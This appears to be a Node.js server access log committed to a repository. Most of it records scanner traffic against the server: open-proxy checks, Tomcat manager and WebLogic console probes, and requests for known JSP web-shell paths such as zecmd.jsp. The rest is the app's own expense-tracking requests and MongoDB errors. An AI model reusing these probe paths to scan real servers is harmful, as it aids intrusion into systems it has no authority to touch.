+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1773052275242741 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5807066035853892 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_159249593107143181071504 [32m200 [0m18.503 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_897617912019655554613280 [32m200 [0m1.371 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1071022705029562484153108 [32m200 [0m1.416 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1393748404419479601114776 [32m200 [0m1.784 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1960883740016662724094916 [32m200 [0m1.400 ms - 2732[0m
+[0mGET / [32m200 [0m7.636 ms - 2732[0m
+[0mHEAD / [32m200 [0m1.474 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1837766269274427 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6348672817064758 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7047592566272160 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1640344483232288 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5441157855584897 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_123094800010216832070000 [32m200 [0m6.953 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_16236279034135564180048 [32m200 [0m1.318 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_192963877802255612283924 [32m200 [0m1.317 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_328090732425875634663800 [32m200 [0m1.395 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_69447228003706053147200 [32m200 [0m1.317 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1604716183260470 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.695 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.google.com/reader/about/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+task begin
+user colour.hu  has no data
+bakcup  data length is: undefined
+[0mGET / [32m200 [0m6.090 ms - 2732[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5525185673542075 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6879563237364110 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_2449614097161593342485900 [32m200 [0m7.495 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_592827189015688922849748 [32m200 [0m1.300 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1939023020035954103131196 [32m200 [0m1.415 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1960883740016142013995040 [32m200 [0m2.793 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_29610121987419831351810472 [32m200 [0m1.296 ms - 2732[0m
+[0mGET http://httpheader.net/ [32m200 [0m1.460 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0118418775850143 [0m- [0m- ms - -[0m
+[0mGET http://115.239.210.27/ [32m200 [0m5.230 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9585346812840943 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://119.90.40.16:8090/ [32m200 [0m7.908 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_114902184002049921972720 [32m200 [0m1.601 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_249123110526665704711080 [32m200 [0m2.883 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_321372028030677764331568 [32m200 [0m1.305 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_25530126988815217203177312 [32m200 [0m1.340 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_2109160320646932269468 [32m200 [0m1.319 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7719119671014304 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m3.906 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.682 ms - 2732[0m
+Not Found
+[0mGET /script [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6872410465060296 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /console/login/LoginForm.jsp [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_20840801685255251776740 [32m200 [0m5.081 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1960871607419404721424264 [32m200 [0m1.480 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_321386433634512484859808 [32m200 [0m1.269 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_5832565561672470496128 [32m200 [0m1.389 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_96605228816132203514920 [32m200 [0m1.310 ms - 2732[0m
+Not Found
+[0mGET http://proxyjudge.us/ [32m200 [0m1.752 ms - 2732[0m
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3033199439905113 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9440904958196892 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET /monthHistory? [32m200 [0m29.762 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m23.566 ms - 277[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m31.026 ms - 3835[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.661 ms - 6010[0m
+userName lilieming
+[{"userName":"lilieming","label":"烟","modifyTime":1462972887931,"count":4,"_id":"5718e89c1efc4003029eddcd"}] result is 
+[0mPUT /moneyDetail [32m200 [0m5.833 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[] result is 
+[0mPUT /moneyDetail [32m200 [0m4.738 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.306 ms - 3609[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.019 ms - 3609[0m
+[0mGET /monthHistory? [32m200 [0m4.899 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m6.168 ms - 277[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m7.857 ms - 3609[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m8.089 ms - 5891[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.895 ms - 3609[0m
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1463920402242,"count":13,"_id":"571793131efc4003029eddbf"}] result is 
+[0mPUT /moneyDetail [32m200 [0m4.848 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m4.981 ms - 3782[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5741457809290913 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.609 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7477434706781874 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1248607329167762947648 [32m200 [0m1.947 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_714713324502342496632688 [32m200 [0m1.370 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_889220034012671822331612 [32m200 [0m1.393 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_4096125481624700683423292 [32m200 [0m2.091 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_7776659821783968548352 [32m200 [0m1.606 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_1929611612929477844129720 [32m200 [0m1.359 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1500058627216686003158404 [32m200 [0m1.334 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_2214118209610747984239584 [32m200 [0m1.302 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_20424132280015217203108240 [32m200 [0m1.316 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1807882940823368325220 [32m200 [0m1.348 ms - 2732[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9970778408002849 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6612303285282521 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3205418759016389 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_858426949612865443966340 [32m200 [0m4.011 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_178718465929722102072160 [32m200 [0m1.415 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_2143415378721733931531100 [32m200 [0m1.409 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_23132925725492161483708 [32m200 [0m1.573 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_52085421002749652281720 [32m200 [0m1.479 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m22.762 ms - 3782[0m
+[0mGET /accountDetail? [32m200 [0m22.893 ms - 277[0m
+[0mGET /monthHistory? [32m200 [0m25.606 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.186 ms - 5891[0m
+userName lilieming
+[] result is 
+[0mPUT /moneyDetail [32m200 [0m7.515 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.109 ms - 3393[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0637440397779969 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9051737657837521 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://123.125.114.238/ [32m200 [0m8.044 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8499603536133199 [0m- [0m- ms - -[0m
+[0mGET http://www.google.com/reader/about/ [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mHEAD / [32m200 [0m4.137 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2221732868830093 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2093359595209834 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m9.915 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0972232388931406 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+task begin
+bakcup  data length is: undefined
+user colour.hu  has no data
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m10.521 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5894731986508517 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5243702240733184 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.751 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m11.796 ms - 2732[0m
+Not Found
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8037302482772204 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /zmeu/zmeu.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /iddqd/iddqd.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /iesvc/iesvc.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /wstats/wstats.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /zecmd/zecmd.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /idsvc/idsvc.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET /wincfg/wincfg.jsp [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_39486032014474251881128 [32m200 [0m8.296 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1062411557923311532831776 [32m200 [0m1.505 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_936520567280282478704 [32m200 [0m1.422 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_4904107654214114881302992 [32m200 [0m1.430 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_53651985769649083059748 [32m200 [0m9.497 ms - 2732[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6617365047196730 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9987342574654255 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m9.515 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.601 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m9.850 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8526493174691524 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1796817233566688862935620 [32m200 [0m4.351 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1506556550646932269468 [32m200 [0m1.290 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1435120080011993672346000 [32m200 [0m1.304 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1224024521431118404329836 [32m200 [0m1.372 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_995550952018180961000440 [32m200 [0m1.418 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_16793409632190382450096 [32m200 [0m1.499 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_765016347620226962916012 [32m200 [0m1.341 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_119464840441688232943272 [32m200 [0m1.419 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1750058627215990753056520 [32m200 [0m1.348 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1480574253212465421178912 [32m200 [0m1.347 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3215966668829047 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7719776359077618 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m5.812 ms - 2732[0m
+[0mGET / [32m200 [0m1.990 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /SiteMap.xml [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m8.327 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7338352978760881 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m13.674 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_23990588846277641069488 [32m200 [0m11.488 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_15422089803775861013264 [32m200 [0m1.319 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_491470325622273202376956 [32m200 [0m1.276 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_3013090480970398399556 [32m200 [0m1.390 ms - 2732[0m
+[0mGET http://119.90.40.16:8090/ [32m200 [0m1.421 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4079941736106931 [0m- [0m- ms - -[0m
+[0mGET http://www.mafengwo.cn/ [32m200 [0m9.257 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m12.326 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m24.720 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9785711343958797 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m20.284 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2374666176352153 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9259242964267735 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_53625020007179484598496 [32m200 [0m11.408 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_8175790780605436750420 [32m200 [0m1.273 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1464462080613783504123264 [32m200 [0m1.434 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_16530160786566775231384 [32m200 [0m11.040 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_43405059602510552203040 [32m200 [0m1.454 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5327583862396916 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4182418494172686 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2295961726435620 [0m- [0m- ms - -[0m
+[0mGET http://123.125.114.238/ [32m200 [0m14.426 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_2205992114016662724194792 [32m200 [0m12.981 ms - 2732[0m
